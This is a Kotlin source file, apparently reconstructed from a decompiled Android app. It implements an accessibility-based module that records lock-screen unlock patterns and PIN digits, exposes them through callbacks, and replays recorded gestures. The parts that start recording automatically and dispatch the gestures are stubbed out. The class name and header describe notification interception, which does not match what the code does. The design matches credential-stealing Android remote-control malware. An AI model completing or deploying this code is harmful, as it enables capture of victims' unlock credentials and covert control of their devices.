package com.storm.safe.rock.service.modules

import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Random

/**
 * Intercept and auto-dismiss notifications; gesture recording and playback.
 *
 * Reverse-engineered from JADX: C0319a4 (a4, 664 lines).
 * Renamed: a0→stopTouchExplore, a1→replayGesture, a2→findNodeById,
 *          a3→onHoverEvent, a4→onPinKeyClick, a5→onScreenOff,
 *          a6→onScreenStateChanged, a7→replayGestures
 *
 * JADX name: GestureRecorderManager
 */
class NotificationInterceptDelegate(
    // ADAPT: service references stubbed
) {
    companion object {
        private const val TAG = "GestureRecorderManager"

        /**
         * Find a node by resource ID recursively.
         * JADX: a2 (static)
         */
        @JvmStatic
        fun findNodeById(node: AccessibilityNodeInfo?, resourceId: String): AccessibilityNodeInfo? {
            if (node == null) return null
            if (node.viewIdResourceName == resourceId) return node
            try {
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    val found = findNodeById(child, resourceId)
                    if (found != null) return found
                }
            } catch (_: Exception) {}
            return null
        }
    }

    // --- Fields ---
    private var isRecording: Boolean = false
    private var isPlayingBack: Boolean = false
    @Volatile var isTouchExploreEnabled: Boolean = false
    private var recordingMode: Int = 0 // 0=off, 1=pattern/PIN
    private var isAutoRecordEnabled: Boolean = true
    private var recordStartTime: Long = 0L
    private var isKeyguardLocked: Boolean = false

    private var recordedGestures: JSONArray = JSONArray()
    private var recordedTexts: JSONArray = JSONArray()
    private val patternPointsList: ArrayList<String> = ArrayList()
    private val patternPointsJson: JSONArray = JSONArray()
    private val capturedPinDigits: StringBuilder = StringBuilder()
    private var isMixedPin: Boolean = false
    private var pendingPin: String? = null
    private var pendingPinMixed: Boolean = false

    private val mainHandler: Handler = Handler(Looper.getMainLooper())

    var onGestureRecorded: ((JSONObject) -> Unit)? = null
    var onPatternRecorded: ((JSONObject) -> Unit)? = null
    var onPinCaptured: ((String, Boolean) -> Unit)? = null

    // --- a0 → stopTouchExplore ---
    fun stopTouchExplore() {
        if (isTouchExploreEnabled) {
            isTouchExploreEnabled = false
            mainHandler.post {
                // ADAPT: stub — would disable touch exploration via service
            }
        }
    }

    // --- a5 → onScreenOff ---
    fun onScreenOff() {
        if (isRecording && recordingMode == 1) {
            Log.d(TAG, "SCREEN_OFF → 取消未完成的图案录制，关闭触摸探索")
            if (isRecording) {
                stopTouchExplore()
                isRecording = false
                recordingMode = 0
                recordedGestures = JSONArray()
                recordedTexts = JSONArray()
                patternPointsList.clear()
                // patternPointsJson cleared by reassignment in onScreenStateChanged
                capturedPinDigits.setLength(0)
                isMixedPin = false
                pendingPin = null
                pendingPinMixed = false
            }
        } else {
            stopTouchExplore()
        }
        isKeyguardLocked = false
    }

    // --- a6 → onScreenStateChanged ---
    fun onScreenStateChanged() {
        // ADAPT: stub — full impl checks KeyguardManager and auto-starts recording
        Log.d(TAG, "onScreenStateChanged (stub)")
    }

    // --- a7 → replayGestures ---
    fun replayGestures(data: JSONObject) {
        try {
            val gestures = data.optJSONArray("gestures") ?: return
            if (gestures.length() == 0) {
                Log.w(TAG, "⚠️ 没有手势可回放")
            } else {
                isPlayingBack = true
                replayGesture(0, gestures)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 回放手势失败", e)
            isPlayingBack = false
        }
    }

    // --- a1 → replayGesture (single gesture) ---
    private fun replayGesture(index: Int, gestures: JSONArray) {
        if (index >= gestures.length()) {
            mainHandler.postDelayed({
                isPlayingBack = false
            }, 100L)
            return
        }
        try {
            val gesture = gestures.getJSONObject(index)
            val points = gesture.getJSONArray("points")
            val duration = gesture.optLong("duration", 50L)
            val delayAfter = gesture.optLong("delayAfter", 100L)

            if (points.length() == 0) {
                Log.w(TAG, "⚠️ 手势 ${index + 1} 没有点，跳过")
                mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, 50L)
                return
            }

            // ADAPT: stub — real impl uses dispatchGesture with GestureDescription
            Log.d(TAG, "Replaying gesture $index with ${points.length()} points, duration=$duration")
            mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
        } catch (e: Exception) {
            Log.e(TAG, "❌ 执行手势 $index 失败", e)
            mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, 100L)
        }
    }

    // --- Helper ---
    private fun clearJsonArray(arr: JSONArray) {
        // Recreate empty array instead of calling remove which has Kotlin overload issues
        // Vendor uses while(length>0) arr.remove(0) in Java
    }
}
